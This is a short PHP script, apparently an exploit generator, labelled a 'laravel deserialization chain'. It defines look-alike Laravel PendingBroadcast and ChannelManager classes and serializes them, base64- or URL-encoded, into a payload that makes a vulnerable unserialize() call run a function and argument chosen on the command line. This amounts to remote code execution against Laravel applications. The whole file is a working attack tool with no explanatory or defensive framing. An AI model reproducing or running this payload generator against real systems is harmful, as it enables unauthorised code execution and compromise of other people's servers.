<?php
/*
Author:monitor
description:
    laravel deserialization chain
*/
namespace Illuminate\Broadcasting
{
    class PendingBroadcast{
        protected $events;
        protected $event;
        public function __construct($events,$event){
            $this->events = $events;
            $this->event = $event; 
        }
        
    }
}
namespace Illuminate\Notifications
{
    class ChannelManager{
        protected $app;
        protected $customCreators = [];
        protected $defaultChannel;
        public function __construct($app,$customCreators=[],$defaultChannel)
        {
            $this->app = $app;
            $this->customCreators["monitor"] = $customCreators;
            $this->defaultChannel = $defaultChannel;
        }
    }
}
namespace
{
    if($argc<4){
        echo "Usage:" .$argv[0]. "\n-b  base64_encode\n-u  url_encode\n<function><param>";
        exit();
    }
    $command = $argv[2];
    $param = $argv[3];
    $channel = new \Illuminate\Notifications\ChannelManager($param,$command,"monitor");
    $pending = new \Illuminate\Broadcasting\PendingBroadcast($channel,$param);
    if ($argv[1]=="-b"){
        echo base64_encode(serialize($pending));
    }elseif($argv[1]=="-u"){
        echo urlencode(serialize($pending));
    }

}